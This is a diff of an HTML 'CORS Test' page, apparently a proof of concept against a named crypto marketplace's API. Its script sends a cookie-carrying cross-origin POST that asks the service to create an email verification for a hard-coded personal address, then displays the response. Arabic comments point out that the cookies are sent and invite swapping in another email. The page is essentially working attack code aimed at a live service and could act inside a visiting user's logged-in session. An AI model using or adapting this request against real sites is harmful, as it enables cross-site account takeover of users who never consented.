@@ -1,30 +1,44 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <title>CORS Test</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f7f7f7; }
+        h1 { color: #333; }
+        pre { background: #eee; padding: 10px; border-radius: 5px; overflow-x: auto; }
+        .error { color: red; font-weight: bold; }
+        .success { color: green; font-weight: bold; }
+    </style>
 </head>
 <body>
-<h1>CORS Test</h1>
-<script>
-    fetch("https://magiceden.io/api/v0/sdk/c1314b5b-ece8-4f4f-a879-3894dda364e4/emailVerifications/create", {
-    method: "POST",
-    credentials: "include",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        email: "yahyashahin812@gmail.com"
-    })
-})
-.then(response => response.text())
-.then(data => {
-    document.body.innerHTML += "<pre>" + data + "</pre>";
-})
-.catch(error => {
-    document.body.innerHTML += "<p>Error: " + error + "</p>";
-});
-</script>
+    <h1>CORS Test</h1>
+    <p>Sending request...</p>
+    <div id="result"></div>
+
+    <script>
+        const resultDiv = document.getElementById("result");
+
+        fetch("https://magiceden.io/api/v0/sdk/c1314b5b-ece8-4f4f-a879-3894dda364e4/emailVerifications/create", {
+            method: "POST",
+            credentials: "include", // يرسل الكوكيز
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                email: "yahyashahin812@gmail.com" // عدل البريد لو حبيت
+            })
+        })
+        .then(response => {
+            resultDiv.innerHTML += `<p>Status: ${response.status} ${response.statusText}</p>`;
+            return response.text();
+        })
+        .then(data => {
+            resultDiv.innerHTML += `<pre class="success">${data}</pre>`;
+        })
+        .catch(error => {
+            resultDiv.innerHTML += `<p class="error">Error: ${error}</p>`;
+        });
+    </script>
 </body>
 </html>
-
